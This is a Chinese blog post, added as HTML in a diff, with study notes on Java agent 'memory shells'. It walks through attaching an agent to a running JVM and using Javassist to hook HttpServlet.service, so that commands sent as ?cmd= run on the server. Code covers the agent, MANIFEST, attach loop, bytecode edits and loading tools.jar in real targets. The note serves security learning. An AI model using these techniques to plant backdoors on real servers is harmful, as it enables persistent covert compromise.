@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-DT27XM4C8J"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-DT27XM4C8J');
+    </script>
+    
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        unknown&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+<body id="bodyx">
+    <div class="hd logodiv" style="margin-top: 3%;">
+    <!-- <img src="/img/logo.png" class="logopng"> -->
+    <p class="logot">
+        <a href="/" style="color: #4f4646;text-decoration: none;">
+            unknown&#39;s blog 
+        </a>
+    </p>
+</div>
+<div class="hd">
+    <ol class="breadcrumb">
+        
+            <li><a class="ba" href="/tech">Tech</a></li>
+        
+            <li><a class="ba" href="/life">Life</a></li>
+        
+            <li><a class="ba" href="/essay">Essay</a></li>
+        
+            <li><a class="ba" href="/links">Friends</a></li>
+        
+            <li><a class="ba" target="_blank" rel="noopener" href="https://running.unk.org.cn/">Running</a></li>
+        
+            <li><a class="ba" href="/about">About</a></li>
+        
+            <li><a class="ba" href="/subscribe">Subscribe</a></li>
+        
+    </ol>
+    <hr class="breadcrumbhr">
+</div>
+
+    
+<div class="hd posts">
+
+    <!-- <a href="/index.html">
+        <i class="fa fa-reply replay-btn" aria-hidden="true"></i>
+    </a> -->
+    <div class="post-title">
+        <p>
+            Agent内存马学习
+        </p>
+        <!-- <hr> -->
+    </div>
+    <div class="post-content">
+        <p><a target="_blank" rel="noopener" href="https://boogipop.com/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/#SpringBoot%E4%B8%AD%E7%9A%84InternalDofilter%E9%93%BE">https://boogipop.com/2023/03/02/Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%89%96%E6%9E%90/#SpringBoot%E4%B8%AD%E7%9A%84InternalDofilter%E9%93%BE</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/1355">https://goodapple.top/archives/1355</a></p>
+<p>agent内存马达到的效果就是：修改底层已经加载的字节码，添加恶意操作。</p>
+<h1 id="Java-Agent-使用"><a href="#Java-Agent-使用" class="headerlink" title="Java Agent 使用"></a>Java Agent 使用</h1><p>分为两种agent，premain-agent的在main方法之前执行，agentmain-agent在main方法之后执行。后面要打内存马的话main方法肯定是已经启动了的，所以主要使用agentmain-agent。</p>
+<h2 id="premain-agent"><a href="#premain-agent" class="headerlink" title="premain-agent"></a>premain-agent</h2><p>MyAgent</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package agent;</span><br><span class="line">import java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line">public class MyAgent &#123;</span><br><span class="line">    public static void premain(String agentArgs, Instrumentation inst) &#123;</span><br><span class="line">        inst.addTransformer(new MyTransformer());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MANIFEST.MF</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Premain-Class: agent.MyAgent</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后打jar包即可。</p>
+<h2 id="agentmain-agent"><a href="#agentmain-agent" class="headerlink" title="agentmain-agent"></a>agentmain-agent</h2><p>premain方法改为agentmain。</p>
+<p>MANIFEST.MF里的Premain-Class改为Agent-Class。</p>
+<h2 id="理解Instrumentation"><a href="#理解Instrumentation" class="headerlink" title="理解Instrumentation"></a>理解Instrumentation</h2><p>agent的方法有这个参数。</p>
+<p>这玩意是专门用来给Agent操作JVM字节码的。</p>
+<p>类加载时，会调用InstrumentationImpl的transform方法。该对象有一个TransformManager，里面有一个list，保存的都是transformer。类加载的字节码依次被transform，上一次transform的结果继续传入下一次transform。transform结束就加载。</p>
+<p>所以我们在agent里可以添加自己的Transformer，对字节码进行修改。</p>
+<p>假如在attach agent之前就已经加载了要修改的类，那么该类在以后都不会被加载，即该字节码不会进入transform。所以我们要在agent里面检查已经加载的类，拿到我们的target，再重新transform。</p>
+<p>agentmain-agent</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MyAgent &#123;</span><br><span class="line">    public static void agentmain(String agentArgs, Instrumentation inst) &#123;</span><br><span class="line">        inst.addTransformer(new MyTransformer(),true);</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        for (Class loadedClass : allLoadedClasses) &#123;</span><br><span class="line">            if(&quot;javax.servlet.http.HttpServlet&quot;.equals(loadedClass.getName()))&#123;</span><br><span class="line">            	</span><br><span class="line">            	//重新transform</span><br><span class="line">                inst.retransformClasses(loadedClass);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>MyTransformer</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class MyTransformer implements ClassFileTransformer &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer)&#123;</span><br><span class="line">        String target = &quot;javax.servlet.http.HttpServlet&quot;;</span><br><span class="line">        </span><br><span class="line">        //中间是修改字节码的操作，下面讲</span><br><span class="line">        </span><br><span class="line">        return new byte[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>自己调试至MyTransformer的transform方法时的调用栈：</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206200214840.png" alt="image-20240206200214840.png"></p>
+<h1 id="操作JVM"><a href="#操作JVM" class="headerlink" title="操作JVM"></a>操作JVM</h1><p>由于下面注入内存马时要用到agent，而一般方法使用agent都是运行时候加<code>-javaagent</code>参数，但从实际注入的角度讲不可能重新运行并且加参数。所以要拿到运行程序的JVM，然后让JVM加载我们的agent。</p>
+<p>idea中代码所在的jar包tools.jar要手动导入。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206154501926.png" alt="image-20240206154501926.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        for(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class="line">            //遍历每一个正在运行的JVM，如果JVM名称为Test则连接该JVM并加载特定Agent</span><br><span class="line">            //JVM名称就是main方法所在的类名</span><br><span class="line">            if(vmd.displayName().equals(&quot;test.Test&quot;))&#123;</span><br><span class="line"></span><br><span class="line">                System.out.println(&quot;attach!&quot;);</span><br><span class="line">                //连接指定JVM</span><br><span class="line">                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());</span><br><span class="line">                //加载Agent</span><br><span class="line">                virtualMachine.loadAgent(&quot;E:\\ideaProjects02\\memshell_agent\\out\\artifacts\\memshell_agent_jar\\memshell_agent.jar&quot;);</span><br><span class="line">                //断开JVM连接</span><br><span class="line">                virtualMachine.detach();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Javaassist使用"><a href="#Javaassist使用" class="headerlink" title="Javaassist使用"></a>Javaassist使用</h1><h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass c = pool.getCtClass(&quot;javax.servlet.http.HttpServlet&quot;);</span><br><span class="line">CtClass reqClass = pool.getCtClass(&quot;javax.servlet.ServletRequest&quot;);</span><br><span class="line">CtClass resClass = pool.getCtClass(&quot;javax.servlet.ServletResponse&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 第一个是方法名，第二个是参数类型</span><br><span class="line">CtMethod ctMethod = c.getDeclaredMethod(&quot;service&quot;,new CtClass[]&#123;reqClass,resClass&#125;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 必须要花括号包住</span><br><span class="line">ctMethod.setBody(&quot;&#123;System.out.println(123);&#125;&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="使用方法参数"><a href="#使用方法参数" class="headerlink" title="使用方法参数"></a>使用方法参数</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/duanxz/p/15664172.html">https://www.cnblogs.com/duanxz/p/15664172.html</a></p>
+<p>插入的代码中，<code>$0</code>表示this，<code>$n</code>表示第n个参数</p>
+<h2 id="插入代码"><a href="#插入代码" class="headerlink" title="插入代码"></a>插入代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//在最开头插入</span><br><span class="line">ctMethod.insertBefore(&quot;System.out.println(123);&quot;);</span><br><span class="line"></span><br><span class="line">//在结尾return之前插入</span><br><span class="line">ctMethod.insertAfter(&quot;System.out.println(123);&quot;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="保存修改后的字节码"><a href="#保存修改后的字节码" class="headerlink" title="保存修改后的字节码"></a>保存修改后的字节码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public byte[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer)&#123;</span><br><span class="line"></span><br><span class="line">        String target = &quot;javax.servlet.http.HttpServlet&quot;;</span><br><span class="line"></span><br><span class="line">        String className = className.replace(&quot;/&quot;, &quot;.&quot;);</span><br><span class="line">        if (className.equals(target)) &#123;</span><br><span class="line">            System.out.println(&quot;Find the Inject Class: &quot;+target);</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            try &#123;</span><br><span class="line"></span><br><span class="line">                CtClass c = pool.getCtClass(className);</span><br><span class="line"></span><br><span class="line">				//... 中间是修改操作</span><br><span class="line"></span><br><span class="line">                byte[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                </span><br><span class="line">                // 这是修改后的字节码</span><br><span class="line">                return bytes;</span><br><span class="line">            &#125; catch (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return new byte[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="寻找hook点"><a href="#寻找hook点" class="headerlink" title="寻找hook点"></a>寻找hook点</h1><p>有这么多铺垫，终于到达这里了。</p>
+<p>目前我们能完成的操作：修改任意类的任意方法。</p>
+<p>那么在springboot处理请求过程中，有哪些方法是必定执行的，我们只要hook他并加入恶意操作即可。注意不能影响正常业务逻辑。</p>
+<p>断点打在controller，看看中间有哪些方法可以利用。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206211813279.png" alt="image-20240206211813279.png"></p>
+<p>理论上任何一定会被调用的方法都可以，不过还得考虑修改代码的难易程度、命令执行结果的回显方式。</p>
+<p>这里我选的是HttpServlet的service方法，方法参数里有response用于回显。</p>
+<p>Transformer部分的代码</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206212112121.png" alt="image-20240206212112121.png"></p>
+<p>写一个controller，操作JVM加载我们的Agent</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206212420376.png" alt="image-20240206212420376.png"></p>
+<p>访问&#x2F;exp，再访问&#x2F;?cmd&#x3D;whoami即可。</p>
+<p><img src="https://unk-blog-image.oss-cn-shenzhen.aliyuncs.com/images/agent-memshell/image-20240206212549447.png" alt="image-20240206212549447.png"></p>
+<h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><p>1、实际环境中 tools.jar并不会在 JVM 启动的时候默认加载，可以利用URLClassloader 来加载。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">File toolsPath = new File(System.getProperty(&quot;java.home&quot;).replace(&quot;jre&quot;,&quot;lib&quot;) + File.separator + &quot;tools.jar&quot;);</span><br><span class="line">URL url = toolsPath.toURI().toURL();</span><br><span class="line"></span><br><span class="line">URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]&#123;url&#125;);</span><br><span class="line">Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachine&quot;);</span><br><span class="line">Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>2、实际环境我们的Agent的jar包需要先写入到环境，JVM才能加载。</p>
+
+    </div>
+    
+    <div class="toc-container">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-Agent-%E4%BD%BF%E7%94%A8"><span class="toc-text">Java Agent 使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#premain-agent"><span class="toc-text">premain-agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#agentmain-agent"><span class="toc-text">agentmain-agent</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3Instrumentation"><span class="toc-text">理解Instrumentation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%93%8D%E4%BD%9CJVM"><span class="toc-text">操作JVM</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Javaassist%E4%BD%BF%E7%94%A8"><span class="toc-text">Javaassist使用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B1%BB"><span class="toc-text">获取类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%B1%BB%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-text">获取类的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E6%96%B9%E6%B3%95%E4%BD%93"><span class="toc-text">修改方法体</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E5%8F%82%E6%95%B0"><span class="toc-text">使用方法参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E5%85%A5%E4%BB%A3%E7%A0%81"><span class="toc-text">插入代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E4%BF%AE%E6%94%B9%E5%90%8E%E7%9A%84%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-text">保存修改后的字节码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEhook%E7%82%B9"><span class="toc-text">寻找hook点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8"><span class="toc-text">实际利用</span></a></li></ol>
+    </div>
+
+    
+        <div id="custom-comments" class="custom-comments">
+    <h3>Comments</h3>
+    <form id="comment-form" class="comment-form">
+        <div class="form-row">
+            <input type="text" id="c-nickname" placeholder="Nickname *" required>
+            <input type="email" id="c-email" placeholder="Email">
+            <input type="url" id="c-website" placeholder="Website">
+        </div>
+        <textarea id="c-content" placeholder="Leave a comment..." required></textarea>
+        <button type="submit" id="c-submit">Submit</button>
+    </form>
+    <div id="comment-list" class="comment-list">
+        <!-- Comments will be loaded here -->
+        <p class="loading">Loading comments...</p>
+    </div>
+</div>
+
+<style>
+    .custom-comments {
+        margin-top: 40px;
+        border-top: 1px solid #eee;
+        padding-top: 20px;
+    }
+    .comment-form {
+        margin-bottom: 30px;
+    }
+    .comment-form .form-row {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 10px;
+    }
+    .comment-form input, .comment-form textarea {
+        width: 100%;
+        padding: 8px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+        background: #f9f9f9;
+    }
+    .comment-form textarea {
+        height: 100px;
+        resize: vertical;
+        margin-bottom: 10px;
+    }
+    .comment-form button {
+        padding: 8px 20px;
+        background: #333;
+        color: #fff;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+    }
+    .comment-form button:hover {
+        background: #555;
+    }
+    .comment-item {
+        margin-bottom: 20px;
+        border-bottom: 1px solid #f0f0f0;
+        padding-bottom: 15px;
+    }
+    .comment-header {
+        margin-bottom: 5px;
+        font-size: 0.9em;
+        color: #666;
+    }
+    .comment-author {
+        font-weight: bold;
+        color: #333;
+        margin-right: 10px;
+    }
+    .comment-date {
+        font-size: 0.8em;
+        color: #999;
+    }
+    .comment-content {
+        line-height: 1.6;
+        color: #333;
+    }
+</style>
+
+<script>
+(function() {
+    const apiUrl = 'https://unk-blo-backend-rduuehbram.cn-shenzhen.fcapp.run';
+    const postUrl = window.location.pathname;
+    const commentList = document.getElementById('comment-list');
+    const commentForm = document.getElementById('comment-form');
+    const submitBtn = document.getElementById('c-submit');
+
+    function formatDate(timestamp) {
+        return new Date(timestamp).toLocaleString();
+    }
+
+    function escapeHtml(text) {
+        if (!text) return '';
+        return text
+            .replace(/&/g, "&amp;")
+            .replace(/</g, "&lt;")
+            .replace(/>/g, "&gt;")
+            .replace(/"/g, "&quot;")
+            .replace(/'/g, "&#039;");
+    }
+
+    // Load comments
+    fetch(`${apiUrl}/api/comments?url=${encodeURIComponent(postUrl)}`)
+        .then(response => response.json())
+        .then(data => {
+            commentList.innerHTML = '';
+            if (data.comments && data.comments.length > 0) {
+                data.comments.forEach(comment => {
+                    const div = document.createElement('div');
+                    div.className = 'comment-item';
+                    
+                    let authorHtml = `<span class="comment-author">${escapeHtml(comment.nickname)}</span>`;
+                    if (comment.website) {
+                        authorHtml = `<a href="${escapeHtml(comment.website)}" target="_blank" class="comment-author">${escapeHtml(comment.nickname)}</a>`;
+                    }
+
+                    div.innerHTML = `
+                        <div class="comment-header">
+                            ${authorHtml}
+                            <span class="comment-date">${formatDate(comment.timestamp)}</span>
+                        </div>
+                        <div class="comment-content">${escapeHtml(comment.content)}</div>
+                    `;
+                    commentList.appendChild(div);
+                });
+            } else {
+                commentList.innerHTML = '<p>No comments yet. Be the first!</p>';
+            }
+        })
+        .catch(err => {
+            console.error('Error loading comments:', err);
+            commentList.innerHTML = '<p>Error loading comments.</p>';
+        });
+
+    // Submit comment
+    commentForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const nickname = document.getElementById('c-nickname').value;
+        const email = document.getElementById('c-email').value;
+        const website = document.getElementById('c-website').value;
+        const content = document.getElementById('c-content').value;
+
+        submitBtn.disabled = true;
+        submitBtn.innerText = 'Submitting...';
+
+        fetch(`${apiUrl}/api/comment`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                post_url: postUrl,
+                nickname: nickname,
+                email: email,
+                website: website,
+                content: content
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.message) {
+                // Add new comment to list immediately
+                const div = document.createElement('div');
+                div.className = 'comment-item';
+                div.innerHTML = `
+                    <div class="comment-header">
+                        <span class="comment-author">${escapeHtml(nickname)}</span>
+                        <span class="comment-date">Just now</span>
+                    </div>
+                    <div class="comment-content">${escapeHtml(content)}</div>
+                `;
+                
+                // Insert at the beginning or append if empty
+                if (commentList.querySelector('.comment-item')) {
+                    commentList.insertBefore(div, commentList.firstChild);
+                } else {
+                    commentList.innerHTML = '';
+                    commentList.appendChild(div);
+                }
+                
+                commentForm.reset();
+            } else {
+                alert('Error: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(err => {
+            console.error('Error submitting comment:', err);
+            alert('Error submitting comment');
+        })
+        .finally(() => {
+            submitBtn.disabled = false;
+            submitBtn.innerText = 'Submit';
+        });
+    });
+})();
+</script>
+
+    
+
+
+</div>
+<script>
+    window.onload = ()=>{
+
+        document.title = document.querySelector('.post-title p').innerText;
+
+        var zoomImgs = function() {
+            const images = document.querySelectorAll('.post-content img'); // Only select images in post content
+            images.forEach(img => {
+                img.style.width = '70%'
+                img.style.height = 'auto'
+            });
+        }
+
+        zoomImgs()
+    }
+    
+</script>
+    
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
+    </p>
+</div>
+
+<input type="hidden" id="valine_appid" value="diYBpeShV6s47KsfNez5JmBU-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="u3BEDbLDNridDApcAzJBWc9N">
+<input type="hidden" id="valine_enable" value="false">
+<input type="hidden" id="valine_placeholder" value="留下你的评论吧...">
+<input type="hidden" id="valine_avatar" value="hide">
+
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/js/lightbox.js"></script>
+
+
+
+<script>
+
+    var valine_appid = $("#valine_appid").val();
+    var valine_appKey = $("#valine_appKey").val();
+    var valine_enable = $("#valine_enable").val();
+    var valine_placeholder = $("#valine_placeholder").val();
+    var valine_avatar = $("#valine_avatar").val();
+
+    if(valine_enable == 'true'){
+        // Valine initialization code only if enabled
+        if (typeof Valine !== 'undefined') {
+            new Valine({
+                el: '#vcomments',
+                appId: valine_appid,
+                appKey: valine_appKey,
+                placeholder: valine_placeholder,
+                avatar: valine_avatar,
+            })
+        }
+    }
+
+</script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
